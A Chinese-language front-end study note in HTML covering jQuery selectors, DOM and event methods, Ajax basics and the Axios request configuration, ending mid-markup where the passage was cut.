<h3 id="内容过滤选择器" tabindex="-1"> 内容过滤选择器</h3>
<table>
<thead>
<tr>
<th>选择器</th>
<th>实例</th>
<th>选取说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>:contains(text)</td>
<td>$(&quot;:contains('W3School')&quot;)</td>
<td>包含指定字符串的所有元素</td>
</tr>
<tr>
<td>:empty</td>
<td>$(&quot;:empty&quot;)</td>
<td>无子（元素）节点的所有元素</td>
</tr>
</tbody>
</table>
<h3 id="可见性选择器" tabindex="-1"> 可见性选择器</h3>
<table>
<thead>
<tr>
<th>选择器</th>
<th>实例</th>
<th>选取说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>:hidden</td>
<td>$(&quot;p:hidden&quot;)</td>
<td>所有隐藏的 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td>:visible</td>
<td>$(&quot;table:visible&quot;)</td>
<td>所有可见的表格</td>
</tr>
<tr>
<td>:has</td>
<td>$(&quot;td:has('p')&quot;)</td>
<td>选择该元素有p标签的元素</td>
</tr>
<tr>
<td>:parent</td>
<td>$(&quot;td:parent&quot;)</td>
<td>选择含有子元素或者文本的元素</td>
</tr>
</tbody>
</table>
<h3 id="表单选择器" tabindex="-1"> 表单选择器</h3>
<table>
<thead>
<tr>
<th>选择器</th>
<th>实例</th>
<th>选取说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>:input</td>
<td>$(&quot;:input&quot;)</td>
<td>所有 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td>:text</td>
<td>$(&quot;:text&quot;)</td>
<td>所有 type=&quot;text&quot; 的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td>:password</td>
<td>$(&quot;:password&quot;)</td>
<td>所有 type=&quot;password&quot; 的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td>:radio</td>
<td>$(&quot;:radio&quot;)</td>
<td>所有 type=&quot;radio&quot; 的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td>:checkbox</td>
<td>$(&quot;:checkbox&quot;)</td>
<td>所有 type=&quot;checkbox&quot; 的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td>:submit</td>
<td>$(&quot;:submit&quot;)</td>
<td>所有 type=&quot;submit&quot; 的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td>:reset</td>
<td>$(&quot;:reset&quot;)</td>
<td>所有 type=&quot;reset&quot; 的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td>:button</td>
<td>$(&quot;:button&quot;)</td>
<td>所有 type=&quot;button&quot; 的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td>:image</td>
<td>$(&quot;:image&quot;)</td>
<td>所有 type=&quot;image&quot; 的 <code>&lt;input&gt;</code> 元素</td>
</tr>
<tr>
<td>:file</td>
<td>$(&quot;:file&quot;)</td>
<td>所有 type=&quot;file&quot; 的 <code>&lt;input&gt;</code> 元素</td>
</tr>
</tbody>
</table>
<h3 id="状态过滤选择器" tabindex="-1"> 状态过滤选择器</h3>
<table>
<thead>
<tr>
<th>选择器</th>
<th>实例</th>
<th>选取说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>:enabled</td>
<td>$(&quot;:enabled&quot;)</td>
<td>所有启用的元素</td>
</tr>
<tr>
<td>:disabled</td>
<td>$(&quot;:disabled&quot;)</td>
<td>所有禁用的元素</td>
</tr>
<tr>
<td>:selected</td>
<td>$(&quot;:selected&quot;)</td>
<td>所有选定的下拉列表元素</td>
</tr>
<tr>
<td>:checked</td>
<td>$(&quot;:checked&quot;)</td>
<td>所有选中的复选框选项</td>
</tr>
</tbody>
</table>
<h2 id="筛选器方法" tabindex="-1"> 筛选器方法</h2>
<h3 id="基本筛选器" tabindex="-1"> 基本筛选器</h3>
<ul>
<li>.first() ---获取匹配的第一个元素</li>
<li>.last() ---获取匹配的最后一个元素</li>
<li>.not() ---从匹配元素的集合中删除与指定表达式匹配的元素</li>
<li>.has() ---保留包含特定后代的元素，去掉那些不含有指定后代的元素。</li>
<li>.eq() ---索引值等于指定值的元素</li>
</ul>
<h3 id="查找筛选器" tabindex="-1"> 查找筛选器</h3>
<ul>
<li>.children()   ---返回匹配元素集合中每个元素的所有子元素（仅儿子辈）。参数可选，添加参数表示通过选择器进行过滤，对元素进行筛选</li>
<li>.find()   ---方法是返回匹配元素集合中每个元素的后代。参数是必选的，可以为选择器、jquery对象可元素来对元素进行筛选。</li>
<li>.siblings(expr) 查找所有兄弟（包括哥哥和弟弟）</li>
<li>.next(expr) ---查找紧挨着的弟弟</li>
<li>.nextAll(expr) ---查找所有的弟弟</li>
<li>.nextUntil(expr) ---查找所有弟弟，直到碰到符合expr条件，不包含符合expr条件的那个元素</li>
<li>.prev(expr) ---查找紧挨着的哥哥</li>
<li>.prevAll(expr) ---查找所有哥哥</li>
<li>.prevUntil(expr) ---查找所有哥哥，直到碰到符合expr条件，不包含符合expr条件的那个元素</li>
<li>.parent()   ---查找当前元素的父元素</li>
<li>.parents()  ---查找当前元素的所有的父辈元素（爷爷辈、祖先辈都找到）</li>
</ul>
<p><strong>expr</strong> 是指可选的参数，包含用于匹配元素的选择器表达式。</p>
<h2 id="操作元素" tabindex="-1"> 操作元素</h2>
<h3 id="操作元素内容" tabindex="-1"> 操作元素内容</h3>
<ul>
<li>$().html() 无参取值，有参赋值，注意：取值取标签，赋值解析标签</li>
<li>$().text() 无参取值，有参赋值，注意：取值不取标签，赋值不解析标签</li>
<li>$().val()  无参取值，有参赋值，相当于表单组件的value</li>
</ul>
<h3 id="操作元素样式" tabindex="-1"> 操作元素样式</h3>
<p><strong>访问class</strong></p>
<ul>
<li>$().addClass(&quot;样式名&quot;) 添加样式</li>
<li>$().removeClass(&quot;样式名&quot;) 移除指定的CSS类名</li>
<li>$().removeClass() 移除所有样式</li>
<li>$().hasClass() 判断样式存不存在</li>
<li>$().toggleClass(“样式名”) 切换CSS类名，有则删除，没有则添加</li>
</ul>
<p><strong>访问css</strong></p>
<ul>
<li>$().css(&quot;样式名&quot;) 取值操作 ( 原始css样式 background-color )</li>
<li>$().css(&quot;样式名&quot;,&quot;样式值&quot;) 赋值操作</li>
<li>$().css({}) 一次性修改多个css样式，参数是json对象，对象属性名是css属性名，对象值是css属性值</li>
<li>$().width() 、 $().height() 无参取值，有参赋值</li>
</ul>
<h3 id="操作元素属性" tabindex="-1"> 操作元素属性</h3>
<p><strong>attr()</strong> 查看设置属性</p>
<ul>
<li>$().attr(attribute)  查看该属性的值</li>
<li>$().attr(attribute, &quot;xx&quot;)// 设置一个属性值</li>
<li>$().attr({k1: v1, k2:v2})// 设置多个属性值，参数是json对象</li>
<li>$().removeAttr(&quot;属性&quot;)// 从每一个匹配的元素中删除一个属性</li>
</ul>
<p><strong>prop()</strong> 查看,设置属性的状态(主要应用于:checked,selected,disabled)</p>
<ul>
<li>prop(&quot;checked&quot;)</li>
<li>prop(&quot;checked&quot;,true) //设置为选中</li>
<li>prop(&quot;checked&quot;,false) //取消选中</li>
</ul>
<h2 id="操作文档" tabindex="-1"> 操作文档</h2>
<p><strong>内部插入</strong></p>
<ul>
<li>$(a).append(b)        //将b添加到a标签里面</li>
<li>$(a).appendTo(b)      //与上面的相反</li>
<li>$(a).prepend(b)       //前置添加</li>
<li>$(a).prependTo(b)     //与上面的相反</li>
</ul>
<p><strong>外部插入</strong></p>
<ul>
<li>$(a).after(b)         //将后者放到前者的后面</li>
<li>$(a).insertAfter(b)   //把前者放到后者的后面</li>
<li>$(a).before(b)        // 将后者放到前者的前面</li>
<li>$(a).insertBefore(b)  //把前者放到后者的前面</li>
</ul>
<p><strong>包裹</strong></p>
<p><strong>替换</strong></p>
<ul>
<li>$(a).replaceWith(b)   //前者被后者所取代(替换)</li>
<li>$(a).replaceAll(b)    //前者取代后者(替换)</li>
</ul>
<p><strong>删除</strong></p>
<ul>
<li>remove()              //方法删除被选元素及其子元素</li>
<li>empty()               //方法删除被选元素的子元素</li>
</ul>
<h2 id="事件" tabindex="-1"> 事件</h2>
<h3 id="事件说明" tabindex="-1"> 事件说明</h3>
<p>事件名指的是：原始JavaScript事件，去掉on。</p>
<table>
<thead>
<tr>
<th>事件</th>
<th>触发条件</th>
</tr>
</thead>
<tbody>
<tr>
<td>click</td>
<td>鼠标单击后,触发...</td>
</tr>
<tr>
<td>dblclick</td>
<td>鼠标双击后,触发..</td>
</tr>
<tr>
<td>mouseenter</td>
<td>当鼠标指针经过或悬停在被选元素时,触发...</td>
</tr>
<tr>
<td>mouseleave</td>
<td>当鼠标指针离开被选元素时，会发生 mouseleave 事件。</td>
</tr>
<tr>
<td>keypress</td>
<td>键被按下</td>
</tr>
<tr>
<td>keydown</td>
<td>键按下的过程</td>
</tr>
<tr>
<td>keyup</td>
<td>键被松开</td>
</tr>
<tr>
<td>hover</td>
<td>鼠标指针悬停在被选元素上时要运行的两个函数。方法触发mouseenter和mouseleave事件(实际上是对这俩方法的封装)</td>
</tr>
<tr>
<td>submit()</td>
<td>当提交表单时,触发...</td>
</tr>
<tr>
<td>change()</td>
<td>当元素的值改变时(仅适用于表单字段),触发...</td>
</tr>
<tr>
<td>focus()</td>
<td>当元素获得焦点时（当通过鼠标点击选中元素或通过 tab 键定位到元素时）触发...(该方法通常与blur()方法一起使用)</td>
</tr>
<tr>
<td>blur</td>
<td>当元素失去焦点时,触发...</td>
</tr>
<tr>
<td>resize</td>
<td>当调整浏览器窗口大小时，触发...</td>
</tr>
<tr>
<td>scroll</td>
<td>当用户滚动指定的元素时，触发...</td>
</tr>
</tbody>
</table>
<h3 id="动态事件绑定" tabindex="-1"> 动态事件绑定</h3>
<ul>
<li>$().事件名(事件处理函数)          $(&quot;#d&quot;).click(function(){})</li>
<li>$().on(&quot;事件名&quot;,事件处理函数)     $(&quot;#d&quot;).on(&quot;click&quot;,function(){})</li>
<li>$().bind(&quot;事件名&quot;,事件处理函数)   $(&quot;#d&quot;).bind(&quot;click&quot;,function(){})
<ul>
<li>js中的是一次添加，多次添加时覆盖的效果</li>
<li>jQuery是追加的效果，可以实现给一个事件添加不同的监听函数。</li>
</ul>
</li>
<li>$().one(&quot;事件名&quot;,事件处理函数)</li>
<li>$().trigger(&quot;事件名&quot;,事件处理函数)</li>
</ul>
<p><strong>页面载入事件</strong>：当HTML页面完成加载时触发函数指定的函数的执行，类似onload事件</p>
<ul>
<li>$(dcoument).ready(function(){ 函数体 })</li>
<li>$(function(){ 函数体 })</li>
<li>特点:可以同时声明多个函数，不会被覆盖。</li>
</ul>
<h3 id="解除事件绑定" tabindex="-1"> 解除事件绑定</h3>
<p>$().unbind(&quot;事件名&quot;)</p>
<h1 id="ajax" tabindex="-1"> Ajax</h1>
<h2 id="ajax-简介" tabindex="-1"> Ajax 简介</h2>
<p>AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。</p>
<p>AJAX 最大的优点是在不重新加载整个页面的情况下，可以与服务器交换数据并更新部分网页内容。</p>
<p>Ajax本身属于js内核中的一部分，jQuery是js的一个框架，是对js的封装，因此jQuery中也维护着Ajax的内容。</p>
<h2 id="ajax-工作原理" tabindex="-1"> Ajax 工作原理</h2>
<p>页面发起请求，会将请求发送给浏览器内核中的Ajax引擎，Ajax引擎会提交请求到服务器端，在这段时间里，客户端可以进行任意操作，知道服务器端将数据返回给Ajax引擎后，会触发你设置的事件，从而执行自定义的js逻辑代码完成某种页面功能。</p>
<p>ajax是前端的技术，由浏览器进行解析执行。</p>
<p><img src="@source/assets/cs-note/preface/basic/ajax-yl.png" alt="" loading="lazy"></p>
<h2 id="ajax-使用" tabindex="-1"> Ajax 使用</h2>
<ul>
<li>创建异步对象。即 XMLHttpRequest 对象。</li>
<li>设置请求的参数。包括：请求的方法、请求的url。</li>
<li>发送请求。</li>
<li>注册事件。 onreadystatechange事件，状态改变时就会调用。</li>
<li>获取返回的数据。
<ul>
<li>普通文本：后台在接收到ajax请求后，处理后直接响应普通字符串给ajax</li>
<li>json数据：后台在接收到ajax请求后，处理后响应json格式的字符串给ajax，ajax处理代码中使用eval()方法将json数据转换为js对的对象，将对象中的数据通过js的dom操作显示到页面中。</li>
<li>xml：后台在接收到ajax请求后，处理后响应xml格式的字符串给ajax。前台使用ajax.responseXML进行数据接收，返回的是xml文档对象(document)。使用document对象将xml中取出并显示到页面中即可。注意：后台的响应数据格式必须设置成xml格式：</li>
</ul>
</li>
</ul>
<h3 id="原生-ajax使用" tabindex="-1"> 原生 Ajax使用</h3>
<ul>
<li>创建ajax引擎对象</li>
<li>覆写onreadystatechange函数
<ul>
<li>判断数据状态码</li>
<li>判断响应状态码</li>
<li>获取响应数据</li>
<li>处理响应信息</li>
</ul>
</li>
<li>创建并发送请求
<ul>
<li>get请求</li>
</ul>
</li>
</ul>
<div><pre><code><span>//get的请求实体拼接在URL后面，？隔开，键值对</span>
ajax<span>.</span><span>open</span><span>(</span><span>"get"</span><span>,</span><span>"url"</span><span>)</span><span>;</span>
ajax<span>.</span><span>send</span><span>(</span><span>null</span><span>)</span><span>;</span>
</code></pre></div><ul>
<li>post请求</li>
</ul>
<div><pre><code><span>//有单独的请求实体</span>
ajax<span>.</span><span>open</span><span>(</span><span>"post"</span><span>,</span> <span>"url"</span><span>)</span><span>;</span>
ajax<span>.</span><span>setRequestHeader</span><span>(</span><span>"Content-Type"</span><span>,</span><span>"application/x-www-form-urlencoded"</span><span>)</span><span>;</span>
ajax<span>.</span><span>send</span><span>(</span><span>"name=张三&amp;pwd=123"</span><span>)</span><span>;</span>
</code></pre></div><ul>
<li>ajax的状态码
<ul>
<li>0 表示XMLHttpRequest已建立，但还未初始化，这时尚未调用open方法</li>
<li>1 表示open方法已经调用，但未调用send方法（已创建，未发送）</li>
<li>2 表示send方法已经调用，其他数据未知</li>
<li>3 表示请求已经成功发送，正在接受数据</li>
<li>4 表示数据已经成功接收。</li>
</ul>
</li>
<li>ajax的异步和同步:ajax.open(method,urL,async)</li>
<li>封装：相同的保留，不同的传参。最终封装成一个js文件。</li>
</ul>
<h3 id="jquery中的ajax" tabindex="-1"> JQuery中的Ajax</h3>
<p>与Ajax操作相关的jQuery方法很多种，但开发中常用的有三种：</p>
<ul>
<li>$.get(url, [data], [callback], [type]);
<ul>
<li>String url：待载入页面的url地址</li>
<li>Map data（可选）：待发送key/value参数</li>
<li>Function callback（可选）：载入成功时的回调函数</li>
<li>String type（可选）：返回内容格式，xml，html，script，json，text，_default</li>
</ul>
</li>
<li>$.post(url, [data], [callback], [type]);</li>
<li>$.ajax({option1:value1,option2:value2});</li>
</ul>
<p><strong>jQuery的ajax方法</strong></p>
<p>常用的option如下：</p>
<ul>
<li>async：是否异步，默认是true，代表异步</li>
<li>data：发送到服务器的参数，建议使用json格式</li>
<li>dataType：服务器端返回的数据类型，常用text和json</li>
<li>success：成功响应执行的函数，对应的类型是function类型</li>
<li>type：请求方式，GET/POST</li>
<li>url：请求服务器端地址</li>
</ul>
<div><pre><code><span>$</span><span>(</span><span>"a"</span><span>)</span><span>.</span><span>click</span><span>(</span><span>function</span><span>(</span><span>)</span><span>{</span> 
    $<span>.</span><span>ajax</span><span>(</span><span>{</span> 
        <span>url</span><span>:</span><span>"http://www.microsoft.com"</span><span>,</span> <span>//请求的url地址</span>
        <span>data</span><span>:</span><span>{</span><span>"key"</span><span>:</span><span>"value"</span><span>}</span><span>,</span>   <span>//参数值</span>
        <span>async</span><span>:</span><span>true</span><span>,</span>             <span>//请求是否异步，默认为异步，这也是ajax重要特性</span>
        <span>dataType</span><span>:</span><span>'json'</span><span>,</span>        <span>//返回格式为json</span>
        <span>type</span><span>:</span><span>'POST'</span><span>,</span>    <span>//请求方式</span>
        <span>beforeSend</span><span>:</span><span>function</span><span>(</span><span>)</span><span>{</span>
            <span>//请求前的处理</span>
        <span>}</span><span>,</span>
        <span>success</span><span>:</span><span>function</span><span>(</span><span>data</span><span>)</span><span>{</span>
            <span>alert</span><span>(</span><span>"请求成功"</span><span>+</span>data<span>)</span><span>;</span> <span>//请求成功时处理</span>
        <span>}</span><span>,</span>
        <span>error</span><span>:</span><span>function</span><span>(</span><span>)</span><span>{</span>
            <span>alert</span><span>(</span><span>"请求出错."</span><span>)</span><span>;</span> <span>//请求出错处理</span>
        <span>}</span><span>,</span> 
        <span>complete</span><span>:</span><span>function</span><span>(</span><span>)</span><span>{</span>
            <span>//请求完成的处理</span>
        <span>}</span>
    <span>}</span><span>)</span><span>;</span> 
    <span>return</span> <span>false</span><span>;</span>
<span>}</span><span>)</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><p>jquery 中 ajax 分类</p>
<ul>
<li>第一层 $.ajax({ 属性名:值,属性名:值})
<ul>
<li>是 jquery 中功能最全的，代码写起来相对最麻烦的.</li>
</ul>
</li>
<li>第二层(简化$.ajax)
<ul>
<li>$.get(url,data,success,dataType)</li>
<li>$.post(url,data,success,dataType)</li>
</ul>
</li>
<li>第三层(简化$.get())
<ul>
<li>$.getJSON(url,data,success) 相当于设置 $.get 中dataType=&quot;json&quot;</li>
<li>$.getScript(url,data,success) 相当于设置 $.get 中dataType=&quot;script&quot;</li>
</ul>
</li>
</ul>
<p>如果服务器返回数据是从表中取出.为了方便客户端操作返回的数据,服务器端返回的数据设置成 json,客户端把 json 当作对象或数组操作.</p>
<p>json:数据格式.</p>
<ul>
<li>JsonObject:json 对象,理解成 java 中对象 {&quot;key&quot;:value,'key&quot;:value}</li>
<li>JsonArray:json 数组 [{&quot;key&quot;:value,&quot;key&quot;:value},{}]</li>
</ul>
<h1 id="axios" tabindex="-1"> Axios</h1>
<h2 id="axios-简介" tabindex="-1"> axios 简介</h2>
<p>Axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中。</p>
<p>本身具有以下<strong>特性</strong></p>
<ul>
<li>从浏览器中创建 XMLHttpRequest</li>
<li>从 node.js 发出 http 请求</li>
<li>支持 Promise API</li>
<li>拦截请求和响应</li>
<li>转换请求和响应数据</li>
<li>取消请求</li>
<li>自动转换JSON数据</li>
<li>客户端支持防止 CSRF/XSRF</li>
</ul>
<h2 id="axios-api" tabindex="-1"> axios API</h2>
<p><strong>axios(config)</strong>:可以通过向 axios 传递相关配置来创建请求</p>
<p><strong>axios(url[, config])</strong></p>
<div><pre><code><span>// 发送 POST 请求</span>
<span>axios</span><span>(</span><span>{</span>
  <span>method</span><span>:</span> <span>'post'</span><span>,</span>
  <span>url</span><span>:</span> <span>'/user/12345'</span><span>,</span>
  <span>data</span><span>:</span> <span>{</span>
    <span>firstName</span><span>:</span> <span>'Fred'</span><span>,</span>
    <span>lastName</span><span>:</span> <span>'Flintstone'</span>
  <span>}</span>
<span>}</span><span>)</span><span>;</span>

<span>// 获取远端图片</span>
<span>axios</span><span>(</span><span>{</span>
  <span>method</span><span>:</span><span>'get'</span><span>,</span>
  <span>url</span><span>:</span><span>'http://bit.ly/2mTM3nY'</span><span>,</span>
  <span>responseType</span><span>:</span><span>'stream'</span>
<span>}</span><span>)</span>
  <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>response</span><span>)</span> <span>{</span>
  response<span>.</span>data<span>.</span><span>pipe</span><span>(</span>fs<span>.</span><span>createWriteStream</span><span>(</span><span>'ada_lovelace.jpg'</span><span>)</span><span>)</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><h3 id="请求方法别名" tabindex="-1"> 请求方法别名</h3>
<ul>
<li>axios.request(config)</li>
<li>axios.get(url[, config])</li>
<li>axios.delete(url[, config])</li>
<li>axios.head(url[, config])</li>
<li>axios.options(url[, config])</li>
<li>axios.post(url[, data[, config]])</li>
<li>axios.put(url[, data[, config]])</li>
<li>axios.patch(url[, data[, config]])</li>
</ul>
<p><strong>注意</strong>：在使用别名方法时， url、method、data 这些属性都不必在配置中指定。</p>
<h3 id="并发请求" tabindex="-1"> 并发请求</h3>
<p>处理并发请求的助手函数</p>
<ul>
<li>axios.all(iterable)</li>
<li>axios.spread(callback)</li>
</ul>
<h3 id="请求配置" tabindex="-1"> 请求配置</h3>
<div><pre><code><span>{</span>
   <span>// `url` 是用于请求的服务器 URL</span>
  <span>url</span><span>:</span> <span>'/user'</span><span>,</span>

  <span>// `method` 是创建请求时使用的方法</span>
  <span>method</span><span>:</span> <span>'get'</span><span>,</span> <span>// default</span>

  <span>// `baseURL` 将自动加在 `url` 前面，除非 `url` 是一个绝对 URL。</span>
  <span>// 它可以通过设置一个 `baseURL` 便于为 axios 实例的方法传递相对 URL</span>
  <span>baseURL</span><span>:</span> <span>'https://some-domain.com/api/'</span><span>,</span>

  <span>// `transformRequest` 允许在向服务器发送前，修改请求数据</span>
  <span>// 只能用在 'PUT', 'POST' 和 'PATCH' 这几个请求方法</span>
  <span>// 后面数组中的函数必须返回一个字符串，或 ArrayBuffer，或 Stream</span>
  <span>transformRequest</span><span>:</span> <span>[</span><span>function</span> <span>(</span><span>data<span>,</span> headers</span><span>)</span> <span>{</span>
    <span>// 对 data 进行任意转换处理</span>
    <span>return</span> data<span>;</span>
  <span>}</span><span>]</span><span>,</span>

  <span>// `transformResponse` 在传递给 then/catch 前，允许修改响应数据</span>
  <span>transformResponse</span><span>:</span> <span>[</span><span>function</span> <span>(</span><span>data</span><span>)</span> <span>{</span>
    <span>// 对 data 进行任意转换处理</span>
    <span>return</span> data<span>;</span>
  <span>}</span><span>]</span><span>,</span>

  <span>// `headers` 是即将被发送的自定义请求头</span>
  <span>headers</span><span>:</span> <span>{</span><span>'X-Requested-With'</span><span>:</span> <span>'XMLHttpRequest'</span><span>}</span><span>,</span>

  <span>// `params` 是即将与请求一起发送的 URL 参数</span>
  <span>// 必须是一个无格式对象(plain object)或 URLSearchParams 对象</span>
  <span>params</span><span>:</span> <span>{</span>
    <span>ID</span><span>:</span> <span>12345</span>
  <span>}</span><span>,</span>

   <span>// `paramsSerializer` 是一个负责 `params` 序列化的函数</span>
  <span>// (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)</span>
  <span>paramsSerializer</span><span>:</span> <span>function</span><span>(</span><span>params</span><span>)</span> <span>{</span>
    <span>return</span> Qs<span>.</span><span>stringify</span><span>(</span>params<span>,</span> <span>{</span><span>arrayFormat</span><span>:</span> <span>'brackets'</span><span>}</span><span>)</span>
  <span>}</span><span>,</span>

  <span>// `data` 是作为请求主体被发送的数据</span>
  <span>// 只适用于这些请求方法 'PUT', 'POST', 和 'PATCH'</span>
  <span>// 在没有设置 `transformRequest` 时，必须是以下类型之一：</span>
  <span>// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span>
  <span>// - 浏览器专属：FormData, File, Blob</span>
  <span>// - Node 专属： Stream</span>
  <span>data</span><span>:</span> <span>{</span>
    <span>firstName</span><span>:</span> <span>'Fred'</span>
  <span>}</span><span>,</span>

  <span>// `timeout` 指定请求超时的毫秒数(0 表示无超时时间)</span>
  <span>// 如果请求话费了超过 `timeout` 的时间，请求将被中断</span>
  <span>timeout</span><span>:</span> <span>1000</span><span>,</span>

   <span>// `withCredentials` 表示跨域请求时是否需要使用凭证</span>
  <span>withCredentials</span><span>:</span> <span>false</span><span>,</span> <span>// default</span>

  <span>// `adapter` 允许自定义处理请求，以使测试更轻松</span>
  <span>// 返回一个 promise 并应用一个有效的响应 (查阅 [response docs](#response-api)).</span>
  <span>adapter</span><span>:</span> <span>function</span> <span>(</span><span>config</span><span>)</span> <span>{</span>
    <span>/* ... */</span>
  <span>}</span><span>,</span>

 <span>// `auth` 表示应该使用 HTTP 基础验证，并提供凭据</span>
  <span>// 这将设置一个 `Authorization` 头，覆写掉现有的任意使用 `headers` 设置的自定义 `Authorization`头</span>
  <span>auth</span><span>:</span> <span>{</span>
    <span>username</span><span>:</span> <span>'janedoe'</span><span>,</span>
    <span>password</span><span>:</span> <span>'s00pers3cret'</span>
  <span>}</span><span>,</span>

   <span>// `responseType` 表示服务器响应的数据类型，可以是 'arraybuffer', 'blob', 'document', 'json', 'text', 'stream'</span>
  <span>responseType</span><span>:</span> <span>'json'</span><span>,</span> <span>// default</span>

  <span>// `responseEncoding` indicates encoding to use for decoding responses</span>
  <span>// Note: Ignored for `responseType` of 'stream' or client-side requests</span>
  <span>responseEncoding</span><span>:</span> <span>'utf8'</span><span>,</span> <span>// default</span>

   <span>// `xsrfCookieName` 是用作 xsrf token 的值的cookie的名称</span>
  <span>xsrfCookieName</span><span>:</span> <span>'XSRF-TOKEN'</span><span>,</span> <span>// default</span>

  <span>// `xsrfHeaderName` is the name of the http header that carries the xsrf token value</span>
  <span>xsrfHeaderName</span><span>:</span> <span>'X-XSRF-TOKEN'</span><span>,</span> <span>// default</span>

   <span>// `onUploadProgress` 允许为上传处理进度事件</span>
  <span>onUploadProgress</span><span>:</span> <span>function</span> <span>(</span><span>progressEvent</span><span>)</span> <span>{</span>
    <span>// Do whatever you want with the native progress event</span>
  <span>}</span><span>,</span>

  <span>// `onDownloadProgress` 允许为下载处理进度事件</span>
  <span>onDownloadProgress</span><span>:</span> <span>function</span> <span>(</span><span>progressEvent</span><span>)</span> <span>{</span>
    <span>// 对原生进度事件的处理</span>
  <span>}</span><span>,</span>

   <span>// `maxContentLength` 定义允许的响应内容的最大尺寸</span>
  <span>maxContentLength</span><span>:</span> <span>2000</span><span>,</span>

  <span>// `validateStatus` 定义对于给定的HTTP 响应状态码是 resolve 或 reject  promise 。如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，promise 将被 resolve; 否则，promise 将被 rejecte</span>
  <span>validateStatus</span><span>:</span> <span>function</span> <span>(</span><span>status</span><span>)</span> <span>{</span>
    <span>return</span> status <span>>=</span> <span>200</span> <span>&amp;&amp;</span> status <span>&lt;</span> <span>300</span><span>;</span> <span>// default</span>
  <span>}</span><span>,</span>

  <span>// `maxRedirects` 定义在 node.js 中 follow 的最大重定向数目</span>
  <span>// 如果设置为0，将不会 follow 任何重定向</span>
  <span>maxRedirects</span><span>:</span> <span>5</span><span>,</span> <span>// default</span>

  <span>// `socketPath` defines a UNIX Socket to be used in node.js.</span>
  <span>// e.g. '/var/run/docker.sock' to send requests to the docker daemon.</span>
  <span>// Only either `socketPath` or `proxy` can be specified.</span>
  <span>// If both are specified, `socketPath` is used.</span>
  <span>socketPath</span><span>:</span> <span>null</span><span>,</span> <span>// default</span>

  <span>// `httpAgent` 和 `httpsAgent` 分别在 node.js 中用于定义在执行 http 和 https 时使用的自定义代理。允许像这样配置选项：</span>
  <span>// `keepAlive` 默认没有启用</span>
  <span>httpAgent</span><span>:</span> <span>new</span> <span>http<span>.</span>Agent</span><span>(</span><span>{</span> <span>keepAlive</span><span>:</span> <span>true</span> <span>}</span><span>)</span><span>,</span>
  <span>httpsAgent</span><span>:</span> <span>new</span> <span>https<span>.</span>Agent</span><span>(</span><span>{</span> <span>keepAlive</span><span>:</span> <span>true</span> <span>}</span><span>)</span><span>,</span>

  <span>// 'proxy' 定义代理服务器的主机名称和端口</span>
  <span>// `auth` 表示 HTTP 基础验证应当用于连接代理，并提供凭据</span>
  <span>// 这将会设置一个 `Proxy-Authorization` 头，覆写掉已有的通过使用 `header` 设置的自定义 `Proxy-Authorization` 头。</span>
  <span>proxy</span><span>:</span> <span>{</span>
    <span>host</span><span>:</span> <span>'127.0.0.1'</span><span>,</span>
    <span>port</span><span>:</span> <span>9000</span><span>,</span>
    <span>auth</span><span>:</span> <span>{</span>
      <span>username</span><span>:</span> <span>'mikeymike'</span><span>,</span>
      <span>password</span><span>:</span> <span>'rapunz3l'</span>
    <span>}</span>
  <span>}</span><span>,</span>

  <span>// `cancelToken` 指定用于取消请求的 cancel token</span>
  <span>// （查看后面的 Cancellation 这节了解更多）</span>
  <span>cancelToken</span><span>:</span> <span>new</span> <span>CancelToken</span><span>(</span><span>function</span> <span>(</span><span>cancel</span><span>)</span> <span>{</span>
  <span>}</span><span>)</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span